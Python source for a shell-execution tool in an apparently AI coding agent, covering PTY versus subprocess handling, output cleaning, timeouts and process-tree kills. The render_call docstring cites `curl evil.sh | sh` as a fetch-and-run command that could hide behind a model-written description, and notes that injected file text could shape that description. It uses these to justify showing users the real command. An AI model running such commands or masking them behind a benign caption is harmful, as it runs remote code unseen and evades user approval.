"""Bash tool: run a shell command.

Executes a shell command and returns its combined stdout/stderr. Use this for
anything Read/Write/Edit/Glob/Grep don't cover — running tests, git, package
managers, etc. Prefers Git Bash on Windows (falls back to PowerShell if Git
Bash isn't installed); on other platforms uses ``/bin/bash``. The working
directory persists across calls within a session (a bare ``cd <dir>`` updates
it without spawning a subprocess). Output is capped at 30000 characters
(head+tail kept, middle elided).

On POSIX, commands run inside a real pseudo-terminal so programs see a tty:
colors, tty semantics, and correct process-tree kill on timeout. On Windows
they run on plain pipes, so that a command which reads stdin gets EOF and
exits instead of waiting for a person who is not there (see ``_use_pty``).
Either way the tool falls back to a plain subprocess if the PTY backend is
unavailable. Background execution is not yet supported.
"""

from __future__ import annotations

import asyncio
import re
import subprocess
from pathlib import Path
from typing import ClassVar

from pydantic import BaseModel, Field

from quickcode import subproc
from quickcode.pty.session import PtySession
from quickcode.tools.base import (
    PermissionSpec,
    Tool,
    ToolCtx,
    ToolResult,
    decode_output,
)

DEFAULT_TIMEOUT_MS = 120_000
MAX_TIMEOUT_MS = 600_000
MAX_OUTPUT_CHARS = 30_000

_GIT_BASH_CANDIDATES = [
    r"C:\Program Files\Git\bin\bash.exe",
    r"C:\Program Files (x86)\Git\bin\bash.exe",
]

_LONE_CD_RE = re.compile(r'^cd\s+(".*"|\'.*\'|\S+)\s*$')

# Set to "1" to run through ConPTY on Windows anyway, for a program that
# genuinely needs a tty. Note the trade in ``_use_pty``: with a tty, a command
# that reads stdin waits for input nobody will type.
PTY_ENV = "QUICKCODE_BASH_PTY"


class PtyNotWorthIt(Exception):
    """Not an error: the reason we are taking the subprocess path on purpose.

    Raised rather than branched so both ways of ending up on plain pipes reach
    the identical fallback, cancellation handling included. A parallel branch
    would be a second copy of that, and the copy that runs on every Windows
    command is the one that must not rot.
    """


def _use_pty(ctx: ToolCtx) -> bool:
    r"""Whether to spend a pseudo-terminal on this command.

    On POSIX, yes: ``openpty`` plus a fork is microseconds and a tty is strictly
    more faithful.

    On Windows, no -- and the reason that matters is not speed.

    **There is nobody to answer a prompt.** A program that reads stdin gets EOF
    under a pipe and exits; under a tty it waits, and an unattended agent has
    no one to type. `git commit` with no `-m`, `ssh`, an npm prompt or a pager
    each turn from an error into a hang that only the timeout ends. Everything
    else the tty buys is spent before the model sees it: colour is stripped
    (``_clean_output``), and a progress bar arrives as carriage-return
    spam. Process-tree kill works on both paths (``_kill_tree``).

    Speed was the original reason and it turned out to be a smaller and more
    interesting one. ConPTY costs a flat ~3.0 s per command, measured on
    Windows 11 26200 against four shells (pty vs plain subprocess): bash -c
    3.113s / 0.032s, bash -lc 3.330s / 0.335s, cmd /c 3.028s / 0.043s,
    powershell 3.285s / 0.196s.

    That 3.0 s is **not** teardown, which is what this comment used to claim.
    ConPTY opens by sending a Primary Device Attributes query -- its first
    bytes are ``\x1b[1t\x1b[c\x1b[?1004h\x1b[?9001h`` -- and then waits about
    three seconds for a terminal to identify itself. Nothing here ever
    answered. Output is not delayed by it (the first byte arrives in 29 ms);
    the wait sits between the command finishing and the session closing.
    Writing ``\x1b[?1;0c`` back when the query appears removes it: 8.14 s to
    5.13 s over three runs.

    So the pty is affordable now, and is still not used here, because the
    stdin argument above does not depend on what it costs. The terminal panel
    *does* answer the query (``quickcode/pty/interactive.py``) -- there a human
    is typing, which is exactly the case a tty is for.
    """
    if not ctx.platform.lower().startswith("win"):
        return True
    import os

    return os.environ.get(PTY_ENV, "") == "1"


class BashInput(BaseModel):
    command: str = Field(..., description="Shell command to execute.")
    description: str = Field(
        "", description="Short (5-10 word) human-readable description of the command."
    )
    timeout_ms: int = Field(
        DEFAULT_TIMEOUT_MS,
        description=f"Timeout in milliseconds (default {DEFAULT_TIMEOUT_MS}, max {MAX_TIMEOUT_MS}).",
    )
    run_in_background: bool = Field(
        False, description="Not yet supported in this build; leave False."
    )


class BashTool(Tool[BashInput]):
    name: ClassVar[str] = "bash"
    description: ClassVar[str] = (
        "Executes a shell command and returns its combined stdout/stderr. Use "
        "this for anything the other tools don't cover: running tests, git, "
        "build tools, package managers, etc. Prefers Git Bash on Windows "
        "(falls back to PowerShell), /bin/bash elsewhere. The working directory "
        "persists across calls in this session. Output over 30000 characters "
        "is truncated (head and tail kept). timeout_ms defaults to 120000 and "
        f"caps at {MAX_TIMEOUT_MS}. run_in_background is not yet supported."
    )
    is_read_only: ClassVar[bool] = False
    # Stop must be able to end a command. `run` kills the process tree on the
    # way out, so cancelling is clean rather than an abandoned child.
    interruptible: ClassVar[bool] = True
    permission = PermissionSpec(mutates=True, target_field="command", shell=True)
    Input = BashInput

    def render_call(self, input: BashInput) -> str:  # noqa: A002
        """The command, always -- never the description in its place.

        This string is what the permission dialog shows, so it is the thing the
        user is actually approving. ``description`` is written by the model,
        which means it is prose from the same source as the command and can
        disagree with it: a line that reads "Query ONVIF device service" may be
        `echo ...`, or `curl evil.sh | sh`. Worse, the model may itself be
        repeating text out of a file it just read, so the label is reachable by
        anything that can put words in front of it.

        Every other tool renders its real target -- ``Read <path>``,
        ``Edit <path>``, ``Fetch <url>``. Bash is the one with the widest blast
        radius and was the only one substituting a caption for it. The
        description is still shown, because a good one genuinely helps, but it
        sits beside the command rather than instead of it.
        """
        command = (input.command or "").strip()
        note = (input.description or "").strip()
        # Kept to one line: the dialog is a single row, and a command long
        # enough to need wrapping is one the user should open in full.
        first = command.splitlines()[0] if command else ""
        more = " …" if len(command.splitlines()) > 1 or len(first) > 160 else ""
        shown = first[:160] + more
        return f"⏺ Bash: {shown}" + (f"  — {note}" if note else "")

    async def run(self, input: BashInput, ctx: ToolCtx) -> ToolResult:  # noqa: A002
        if input.run_in_background:
            return ToolResult(
                content=(
                    "Error: run_in_background is not yet supported in this build. "
                    "Re-run with run_in_background=False."
                ),
                is_error=True,
            )

        cwd = Path(ctx.extra.get("bash_cwd", ctx.cwd))

        stripped = input.command.strip()
        m = _LONE_CD_RE.match(stripped)
        if m:
            return _handle_cd(m.group(1), cwd, ctx)

        timeout_ms = min(max(input.timeout_ms or DEFAULT_TIMEOUT_MS, 1), MAX_TIMEOUT_MS)
        timeout_s = timeout_ms / 1000.0

        argv = _build_argv(input.command, ctx)

        # A pseudo-terminal where it is cheap, plain pipes where it is not.
        # Falls back to pipes on any PTY error too (backend missing, spawn
        # failure, ...) -- which is the same code path, so it stays exercised.
        session: PtySession | None = None
        try:
            if not _use_pty(ctx):
                raise PtyNotWorthIt
            session = PtySession(argv, cwd=str(cwd))
            raw_out, returncode, timed_out = await asyncio.to_thread(session.run, timeout_s)
            text = _clean_output(raw_out)
        except asyncio.CancelledError:
            # Stop, mid-command. Cancelling this coroutine does not reach the
            # child -- `run` is parked in a worker thread and `find /` would
            # keep going to its own timeout, which is exactly what made the
            # interrupt look ignored. Kill the tree, then let the cancellation
            # continue on its way.
            if session is not None:
                session.kill()
            raise
        except Exception:  # noqa: BLE001 - any PTY failure -> subprocess fallback
            # The fallback needs the same cancellation handling as the PTY
            # path, and needs it more: this is what a plain `pip install
            # quickcode` runs, without the `pty` extra. Stop was inert here --
            # the UI told the user and the model the command had been
            # interrupted while it ran happily to completion. `holder` is how
            # this coroutine reaches the process the worker thread started.
            holder: list = []
            try:
                return await asyncio.to_thread(
                    _run_subprocess, argv, str(cwd), timeout_s, timeout_ms, ctx, holder
                )
            except asyncio.CancelledError:
                proc = holder[0] if holder else None
                if proc is not None and proc.poll() is None:
                    _kill_tree(proc.pid, ctx)
                raise

        text = _cap(text)

        if timed_out:
            msg = f"Error: command timed out after {timeout_ms}ms and was killed.\n{text}"
            return ToolResult(content=msg, is_error=True)

        if returncode != 0:
            content = (
                f"Command exited with code {returncode}.\n{text}"
                if text
                else f"Command exited with code {returncode}."
            )
            return ToolResult(content=content, is_error=True)

        return ToolResult(content=text or "(no output)")


def _handle_cd(raw_target: str, cwd: Path, ctx: ToolCtx) -> ToolResult:
    target = raw_target.strip()
    if (target.startswith('"') and target.endswith('"')) or (
        target.startswith("'") and target.endswith("'")
    ):
        target = target[1:-1]

    new_path = Path(target)
    if not new_path.is_absolute():
        new_path = (cwd / new_path).resolve()
    else:
        new_path = new_path.resolve() if new_path.exists() else new_path

    if not new_path.exists() or not new_path.is_dir():
        return ToolResult(
            content=f"Error: cannot cd into {new_path}: no such directory.",
            is_error=True,
        )

    ctx.extra["bash_cwd"] = new_path
    return ToolResult(content=f"Changed working directory to {new_path}")


# CSI/OSC/other ANSI escape sequences and the ConPTY init handshake
# (\x1b[1t \x1b[c \x1b[?...h/l ...). Stripped so the model sees clean text; the
# PTY still makes programs emit colors / take their tty code paths.
_ANSI_RE = re.compile(
    r"\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)"  # OSC ... BEL/ST
    r"|\x1b[@-Z\\-_]"  # 2-char escapes (excluding CSI '[')
    r"|\x1b\[[0-?]*[ -/]*[@-~]"  # CSI sequences
)


def _clean_output(raw: bytes) -> str:
    """Decode a command's bytes and strip terminal control noise.

    Both paths call this. They used to disagree: the PTY path stripped escapes
    and the subprocess path handed them through untouched, so on Windows --
    where the subprocess path is the default -- anything that forces color
    (``ls --color=always``, ``pytest --color=yes``, most npm output) spent the
    model's tokens on escape bytes and drew them raw in the transcript.
    """
    text = decode_output(raw)
    text = _ANSI_RE.sub("", text)
    text = text.replace("\r\n", "\n")
    if "\r" in text:
        text = "\n".join(_collapse_redraws(line) for line in text.split("\n"))
    return text


def _collapse_redraws(line: str) -> str:
    """Apply carriage returns the way a terminal does: overwrite, don't stack.

    A progress bar is one line redrawn a few hundred times. Turning every CR
    into a newline, which is what this used to do, gave the model four hundred
    lines of `pip install` and the reader a wall of near-identical bars. A
    terminal shows the line it finished on, so that is what we keep.

    Overwriting is not the same as taking the last segment. `100%\\r5%` really
    does leave `5%0%` on a real terminal, and a cleaner that printed `5%` would
    be inventing output nobody saw.
    """
    if "\r" not in line:
        return line
    buf: list[str] = []
    col = 0
    for ch in line:
        if ch == "\r":
            col = 0
        elif col == len(buf):
            buf.append(ch)
            col += 1
        else:
            buf[col] = ch
            col += 1
    return "".join(buf)


def _run_subprocess(
    argv: list[str], cwd: str, timeout_s: float, timeout_ms: int, ctx: ToolCtx,
    holder: list | None = None,
) -> ToolResult:
    """Fallback path when the PTY backend is unavailable. Plain pipes.

    ``holder`` is filled with the ``Popen`` as soon as it exists, so the caller
    -- which is waiting on a worker thread and cannot see this frame -- can
    kill the process tree if the turn is interrupted.
    """
    try:
        proc = subproc.popen(
            argv,
            cwd=cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
    except OSError as exc:
        return ToolResult(content=f"Error: failed to start command: {exc}", is_error=True)
    if holder is not None:
        holder.append(proc)

    try:
        raw_out, _ = proc.communicate(timeout=timeout_s)
        returncode = proc.returncode
    except subprocess.TimeoutExpired:
        _kill_tree(proc.pid, ctx)
        try:
            raw_out, _ = proc.communicate(timeout=5)
        except Exception:  # noqa: BLE001
            raw_out = b""
        text = _clean_output(raw_out)
        text = _cap(text)
        msg = f"Error: command timed out after {timeout_ms}ms and was killed.\n{text}"
        return ToolResult(content=msg, is_error=True)

    text = _clean_output(raw_out)
    text = _cap(text)

    if returncode != 0:
        content = (
            f"Command exited with code {returncode}.\n{text}"
            if text
            else f"Command exited with code {returncode}."
        )
        return ToolResult(content=content, is_error=True)

    return ToolResult(content=text or "(no output)")


def _build_argv(command: str, ctx: ToolCtx) -> list[str]:
    is_windows = ctx.platform.lower().startswith("win")
    if is_windows:
        bash_path = _find_git_bash()
        if bash_path:
            return [bash_path, "-lc", command]
        return ["powershell", "-NoProfile", "-NonInteractive", "-Command", command]
    return ["/bin/bash", "-lc", command]


def _find_git_bash() -> str | None:
    import shutil

    for candidate in _GIT_BASH_CANDIDATES:
        if Path(candidate).exists():
            return candidate
    found = shutil.which("bash")
    if found:
        return found
    return None


def _kill_tree(pid: int, ctx: ToolCtx) -> None:
    if ctx.platform.lower().startswith("win"):
        try:
            subproc.run(
                ["taskkill", "/T", "/F", "/PID", str(pid)],
                capture_output=True,
                timeout=10,
            )
        except Exception:
            pass
    else:
        import os
        import signal

        try:
            os.kill(pid, signal.SIGKILL)
        except Exception:
            pass


def _cap(text: str, limit: int = MAX_OUTPUT_CHARS) -> str:
    if len(text) <= limit:
        return text
    half = limit // 2
    head = text[:half]
    tail = text[-half:]
    return (
        f'{head}\n<truncated total="{len(text)}" '
        f'hint="middle omitted, {len(text) - limit} chars elided"/>\n{tail}'
    )
